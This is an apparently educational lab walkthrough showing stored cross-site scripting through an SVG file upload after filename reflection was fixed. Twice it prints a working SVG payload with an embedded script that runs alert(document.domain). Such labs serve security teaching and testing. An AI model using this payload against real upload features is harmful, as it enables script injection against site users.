# Lab 9: XSS with File Upload (File Content)

## Introduction to the Lab

This Lab will provide you a walkthrough of how a Cross-Site Scripting (XSS) can be exploited if there exists a file upload functionality but without any reflection.

Over here we have a web application that asks to upload a file, it can be any file.  

## Steps to Reproduce

Same as previous lab, But there is a twist here because the developer has mitigated that previous issue where file name was reflected on the webpage. 

![https://i.imgur.com/a8I30rz.png](https://i.imgur.com/a8I30rz.png)

But we are smarter than the developer, we can figure out other ways to achieve XSS in this case.

Here, we can use an SVG file that includes our malicious XSS payload which when uploaded to the web server gives us XSS.

We can use this malicious code given below and name the file as `something.svg`

```xml
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <circle cx="5" cy="5" r="5" stroke-width="5" fill="white" />
    <foreignObject width="1920" height="1080">
        <body xmlns="http://www.w3.org/1999/xhtml">
            <center><h1>Example XSS/Phishing Exploit</h1></center>
        </body>
        <script>alert(document.domain)</script>
    </foreignObject>
</svg>
```

Now, let's upload the same file and see how the server reacts.

![https://i.imgur.com/Kacfjyl.png](https://i.imgur.com/Kacfjyl.png)

Cool! That was interesting, it Worked :)

## Payload(s) Used

Here in this lab i have used a malicious XML code which when included inside a .svg file executes the malicious code in the browser while loading and trigger the XSS.

```xml
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <circle cx="5" cy="5" r="5" stroke-width="5" fill="white" />
    <foreignObject width="1920" height="1080">
        <body xmlns="http://www.w3.org/1999/xhtml">
            <center><h1>Example XSS/Phishing Exploit</h1></center>
        </body>
        <script>alert(document.domain)</script>
    </foreignObject>
</svg>
```

## 

## Conclusion

This lab was an attempt to provide how one can perform XSS when we have a file upload functionality. The XSS we saw in this lab where the file name was not Reflected but we have found other ways to execute our malicious script in the browser  which has a severity of P3 with a CVSS score of 5.8 which is Medium.